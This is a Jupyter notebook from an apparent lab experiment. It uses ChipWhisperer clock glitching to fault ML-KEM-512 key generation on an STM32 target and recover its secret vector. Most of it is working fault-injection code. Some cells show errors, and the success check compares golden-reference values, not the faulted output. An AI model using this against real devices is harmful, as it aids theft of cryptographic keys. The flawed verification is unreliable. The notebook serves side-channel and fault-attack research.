In [1]:
SCOPETYPE = 'OPENADC'
PLATFORM = 'CW308_STM32F3'
SS_VER = 'SS_VER_2_1'

In [2]:
import os
print(os.getcwd())

D:\ChipWhisperer\chipwhisperer\mlkem-512


In [3]:
import chipwhisperer as cw
scope = cw.scope()
target = cw.target(scope,cw.targets.SimpleSerial2)

OSError: Could not find ChipWhisperer. Is it connected?

In [ ]:
%run "../jupyter/Setup_Scripts/Setup_Generic.ipynb"

In [ ]:
%%bash -s "$PLATFORM" "$SS_VER"
cd ../../../firmware/mcu/simpleserial-mlkem
make clean PLATFORM=$1 SS_VER=$2 -j

In [ ]:
fw_path = "../../../firmware/mcu/simpleserial-mlkem/simpleserial-bootloader-{}.hex".format(PLATFORM)
cw.program_target(scope, prog, fw_path)
target.reset_comms()

MLKEM Key Gen code (to obtain golden key gen as well to verify successful attack or not)

Using existing library framework

link: https://github.com/AntonKueltz/ml-kem

In [4]:
# %%bash 
# pipx install mlkem
# pip show mlkem

CHECK FOR MLKEM PYTHON LIBRARY FOR GOLDEN REFERENCE

In [3]:
import importlib, subprocess, sys
if importlib.util.find_spec("mlkem") is None:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "mlkem"])
from mlkem.ml_kem import ML_KEM
from mlkem.k_pke import K_PKE
from mlkem.parameter_set import ML_KEM_512
print(f"[OK] mlkem library available")

[OK] mlkem library available


AUXILIARY FUNCTIONS FOR GOLDEN REFERENCE AS WELL AS VERIFICATION

In [12]:
# ── mlkem library imports ─────────────────────────────────────────────
import numpy as np
from mlkem.ml_kem               import ML_KEM
from mlkem.k_pke                import K_PKE
from mlkem.parameter_set        import ML_KEM_512
from mlkem.auxiliary.general    import byte_decode
from mlkem.auxiliary.sampling   import sample_ntt
from mlkem.auxiliary.ntt        import multiply_ntt, ntt, ntt_inv
from mlkem.math.polynomial_ring import PolynomialRing, RingRepresentation
from mlkem.math.field           import Zm

Q = 3329
K = 2        # ML-KEM-512

# ── Decode helpers ────────────────────────────────────────────────────
def unpack_pk(pk_bytes: bytes):
    """800-byte public key -> (t_hat[K], rho).
    t_hat elements are PolynomialRing in NTT representation.
    """
    t_hat = []
    for i in range(K):
        coeffs = byte_decode(12, pk_bytes[384*i : 384*(i+1)])
        t_hat.append(PolynomialRing(coeffs, RingRepresentation.NTT))
    rho = pk_bytes[768:800]
    return t_hat, rho

def unpack_sk(sk_bytes: bytes):
    """First 768 bytes of the secret key -> s_hat[K] (NTT domain)."""
    s_hat = []
    for i in range(K):
        coeffs = byte_decode(12, sk_bytes[384*i : 384*(i+1)])
        s_hat.append(PolynomialRing(coeffs, RingRepresentation.NTT))
    return s_hat

# ── Matrix A reconstruction ───────────────────────────────────────────
def generate_matrix_A(rho: bytes):
    """Rebuild A_hat[i][j] from rho via sample_ntt (library XOF / SHAKE-128)."""
    return [[sample_ntt(rho + bytes([j, i])) for j in range(K)]
            for i in range(K)]

# ── Fault verification ────────────────────────────────────────────────
def verify_fault_success(t_hat, s_hat, A_hat):
    """
    Compute  e_hat[i] = t_hat[i] - sum_j(A_hat[i][j] * s_hat[j])  mod q
    Check    e_hat[i] == s_hat[i]  for all i  (nonce-reset condition).
    All operands: PolynomialRing, NTT representation.
    Returns (bool, e_hat list).
    """
    e_hat = []
    for i in range(K):
        acc = PolynomialRing([Zm(0, Q)] * 256, RingRepresentation.NTT)
        for j in range(K):
            acc = acc + multiply_ntt(A_hat[i][j], s_hat[j])
        e_hat.append(t_hat[i] - acc)
    fault_confirmed = all(e_hat[i] == s_hat[i] for i in range(K))
    return fault_confirmed, e_hat

print("[OK] Library imports and helpers ready.")


In [ ]:
def reboot_flush():
    reset_target(scope)
    target.reset_comms()
    target.flush()
    target.simpleserial_write('b', bytearray([]))
    target.simpleserial_wait_ack(timeout=500)

scope.clock.adc_src = "clkgen_x4"  #"clkgen_x1"
reboot_flush()

In [6]:
_seed_iter = iter([])   # global variable to avoid code breaking

def deterministic_rng(n: int) -> bytes:
    """Return the pre-recorded target seed on the first 64-byte request."""
    val = next(_seed_iter)
    assert len(val) == n, f"RNG asked for {n} bytes but seed is {len(val)} bytes"
    return val

def complete_gold_keygen(trial,d):
    d= seeds[:32]
    ml_kem_512 = ML_KEM(parameters=ML_KEM_512, randomness=deterministic_rng, fast=False) #no c speedup for now
    golden_ek, golden_dk = ml_kem_512.key_gen()   # ek = public, dk = decapsulation

    k_pke = K_PKE(ML_KEM_512)
    ek_pke_bytes, dk_pke_bytes = k_pke.key_gen(d)

    golden_pk_reference = np.frombuffer(ek_pke_bytes, dtype=np.uint8)  # 800 bytes

    golden_t_vec, golden_rho = unpack_pk(ek_pke_bytes) # t vector
    A_hat_matrix = generate_matrix_A(golden_rho) # matrix A

    golden_s_vec = unpack_sk(dk_pke_bytes) # s vector

    print(f"[GOLDEN] ek_pke ({len(ek_pke_bytes)}B)  — matches CRYPTO_PUBLICKEYBYTES=800")
    print(f"[GOLDEN] dk_pke ({len(dk_pke_bytes)}B)  — s vector decoded")
    print(f"[GOLDEN] rho    = {golden_rho.hex()}")
    print(f"[GOLDEN] t[0][:4] = {golden_t_vec[0][:4]}")
    print(f"[GOLDEN] s[0][:4] = {golden_s_vec[0][:4]}")

    if trial==1:
        return golden_pk_reference
    else:
        return (golden_pk_reference,golden_t_vec,golden_s_vec,A_hat_matrix)

TRIAL RUN TO VERIFY OVERALL WORKING 
this is to check whether the python golden reference value and the bootloader code is the same or not. else first we need to debug here before proceeding with trace collection etc

In [15]:
import time

reboot_flush()
scope.arm()

target.simpleserial_write('b', bytearray([])) #clear buffers
target.simpleserial_wait_ack(timeout=500)
time.sleep(0.05)

#get random seeds
target.simpleserial_write('g',bytearray([])) 
time.sleep(0.1)
raw_seeds = target.simpleserial_read('r',64)
if len(raw_seeds) != 64:
    raise RuntimeError(
        "[ERROR] Failed to read 64-byte seed. "
        "Check firmware 'g' handler and baud rate.")
seeds = bytes(raw_seeds) #np.array(list(raw_seeds), dtype=np.uint8)

d=seeds[:32]
z=seeds[32:]

print(f"'d':{d}")
print(f"'z':{z}")

#actual key_gen
target.simpleserial_write('k', bytearray([])) #trigger keygen
scope.capture()
time.sleep(0.5)
pk_bytes = target.simpleserial_read('r', 800,timeout=1000)
if len(pk_bytes) != 800:
    raise RuntimeError("[ERROR] Public key read from target failed.")

#this run is only for debug (not for real application)
target.simpleserial_write('s', bytearray([])) # check secret key as well
time.sleep(0.1)
sk_bytes = target.simpleserial_read('r',1632,timeout=1000)
if len(sk_bytes) != 1632:
    raise RuntimeError("[ERROR] Secret key read from target failed.")


#GOLDEN REFERENCE CREATION
_seed_iter = iter([seeds])   # single shot
golden_pk_reference = complete_gold_keygen(1,seeds[:32]) #gold ref
pk_byte_array = np.frombuffer(bytes(pk_bytes), dtype=np.uint8)

#VERIFICATION: NO ATTACK HAS BEEN DONE, HENCE OUTPUT SHOULD BE MATCHED
if bytes(pk_bytes) == golden_pk_reference:
    print("[OK] Target pk == library-derived golden pk — seeds match perfectly.")
else:
    diff = np.sum(pk_byte_array != golden_pk_reference)
    print(f"[WARN] {diff} byte(s) differ between target pk and library golden.")
    print("       Possible cause: target rand() seeded differently from reported seed.")
    print("       Check that golden_seeds[] is populated BEFORE crypto_kem_keypair_deriver() runs.")



[INFO] Computing golden references from deterministic seeds...


NameError: name 'reboot_flush' is not defined

TRACE PROFILING TO IDENTIFY POTENTIAL GLITCH POINTS TO FURTHER NARROW DOWN attack position

In [ ]:
scope.adc.samples = 24400
scope.adc.offset = 0 #CAN CHANGE STUFF IF NEEDED #waiting samples after trigger to start capturing data

In [ ]:
scope.glitch.clk_src = "clkgen"
scope.glitch.output = "glitch_only"
scope.glitch.trigger_src = "ext_single"

scope.adc.timeout = 4 #CAN CHANGE STUFF HERE
reboot_flush()
scope.arm()
target.simpleserial_write('b', bytearray([])) 
target.simpleserial_wait_ack(timeout=500)


#get random seeds
target.simpleserial_write('g',bytearray([])) 
time.sleep(0.1)
raw_seeds = target.simpleserial_read('r',64)
if len(raw_seeds) != 64:
    raise RuntimeError(
        "[ERROR] Failed to read 64-byte seed. "
        "Check firmware 'g' handler and baud rate.")
seeds = bytes(raw_seeds) #np.array(list(raw_seeds), dtype=np.uint8)

d=seeds[:32]
z=seeds[32:]

print(f"'d':{d}")
print(f"'z':{z}")

#actual key_gen
target.simpleserial_write('k', bytearray([])) #trigger keygen
time.sleep(0.5)
pk_bytes = target.simpleserial_read('r', 800,timeout=1000)
if len(pk_bytes) != 800:
    raise RuntimeError("[ERROR] Public key read from target failed.")

ret = scope.capture()
if ret:
    print("increase adc timeout value")
trace = scope.get_last_trace()

#see the output once to check the entire flow once
cw.plot(trace)

In [ ]:
#guess the best glitch spot based on the number of times shake rounds for s and e
#shake has 24 rounds of implementation
#glitch insertion must be done at the end of s {rather in between shake of s since "n" is already taken}

trig_count = scope.adc.trig_count
print(f"trig_count= {trig_count}")
glitch_spots = list(range(trig_count - 2000, trig_count, 1)) #change this section based on what you see in plot
#print(glitch_spots)

#CHIPWHISPERER Initialisations FOR GLITCHING

In [ ]:
scope.cglitch_setup(default_setup=False) # make sure default_setup is off so we don't overwrite our adc settings

gc = cw.GlitchController(groups=["success", "reset", "normal"], parameters=["width", "offset", "ext_offset"])
gc.display_stats()

In [ ]:
#CHANGE STUFF HERE {ESPECIALLY WHILE MAKING IT FINER}
scope.cglitch_setup(default_setup=False)   # preserve adc settings
gc.set_global_step(1) #coarse run before specific fine run

gc.set_range("width",0,48)
gc.set_range("offset",-48,48) #full sweep for both


# gc.set_range("width", 0.4, 10)
# gc.set_range("offset", 40, 49.8)
# gc.set_range("ext_offset", 5000//4, 8000//4)
#this is to be replaced by the below trig_count

# gc.set_range("width", 35, 48)
# gc.set_step("width", 0.4)      # Fine decimal adjustments for the Spartan-6 clock module

# gc.set_range("offset", -4, 4)
# gc.set_step("offset", 1)     # Fine decimal adjustments

# Safely step through your predetermined target instruction cycles
gc.set_range("ext_offset", glitch_spots[0], glitch_spots[-1]) #may have to reduce this once we identify some pattern
gc.set_step("ext_offset", glitch_spots[1] - glitch_spots[0])

gc.set_range("tries", 1, 1)
scope.glitch.repeat = 1

broken = False


In [ ]:
x_bound = (-48, 48)
y_bound = (glitch_spots[0], glitch_spots[-1])
gc.glitch_plot(plotdots={"success":"og", "reset":"xr", "normal":None}, x_bound=x_bound, y_bound=y_bound,
               x_index="width", y_index="ext_offset")

ACTUAL ATTACK STARTS HERE

In [ ]:
import time
import struct

scope.glitch.repeat = 1 #can change this

reboot_flush()
target.reset_comms()
x = []
req_encs = 10
encs = 0

project = cw.create_project("projects/test_mlkem_keygen_bootloader", overwrite=True)

#glitch loop
for glitch_setting in gc.glitch_values():
    if encs >= req_encs:
        print("[INFO] Target number of successful faults achieved. Exiting.")
        break
    # Program scope hardware parameters
    scope.glitch.width = glitch_setting[0]
    scope.glitch.offset = glitch_setting[1]
    scope.glitch.ext_offset = glitch_setting[2]
    
    if scope.adc.state:
        gc.add("reset")
        print("increase adc timeout value ")
        reboot_flush()
        continue
        
    
    reboot_flush()
    scope.arm()
    #perform the glitch here
    target.simpleserial_write('b', bytearray([])) 
    target.simpleserial_wait_ack(timeout=500)
    #get random seeds
    target.simpleserial_write('g',bytearray([])) 
    time.sleep(0.1)
    raw_seeds = target.simpleserial_read('r',64)
    #actual key_gen
    target.simpleserial_write('k', bytearray([])) #trigger keygen
    time.sleep(0.5)
    pk_bytes = target.simpleserial_read('r', 800,timeout=1000)
    #task ends here
    
    ret = scope.capture()
    if ret:
        gc.add("reset")
        reboot_flush()
        continue
    #basic verification before proceeding to golden reference
    if len(raw_seeds) != 64:
        raise RuntimeError(
            "[ERROR] Failed to read 64-byte seed. "
            "Check firmware 'g' handler and baud rate.")
    if len(pk_bytes) != 800:
        raise RuntimeError("[ERROR] Public key read from target failed.")

    #golden reference generation
    seeds = bytes(raw_seeds) #np.array(list(raw_seeds), dtype=np.uint8)
    _seed_iter = iter([seeds])   # single shot
    (golden_pk_reference,t_v,s_v,A_m) = complete_gold_keygen(0,seeds[:32]) #gold ref
    pk_byte_array = np.frombuffer(bytes(pk_bytes), dtype=np.uint8)

    if bytes(pk_bytes) == golden_pk_reference:
        gc.add("normal")
    else: 
        print(f"Glitched!\n width={scope.glitch.width}\noffset={scope.glitch.offset}\next_offset={scope.glitch.ext_offset}")
        #extract secret key
        (fault,e_v) = verify_fault_success(t_v,s_v,A_m)
        if fault:
            print(f"Successfully got the secret vector e=s: {bytes(e_v)}")
            x.append(scope.get_last_trace())
            trace = cw.Trace(scope.get_last_trace())
            project.traces.append(trace)
            #break
            encs += 1
        else:
            print("glitched but failed to retrieve key")

print("[INFO] Glitch execution run completed.")

In [ ]:
project.save()

In [ ]:
#10 SUCCESSFUL TRACES: NOT NEEDED TO FIND OUT THE KEY. JUST TO IDENTIFY THE WORKING AND
#FIND ANY DISSIMILARITY

plot = cw.plot(x[0])
for y in x[1:10]:
    plot += cw.plot(y)
plot

In [ ]:
results = gc.calc(sort="success_rate")
results

In [ ]:
scope.dis()
target.dis()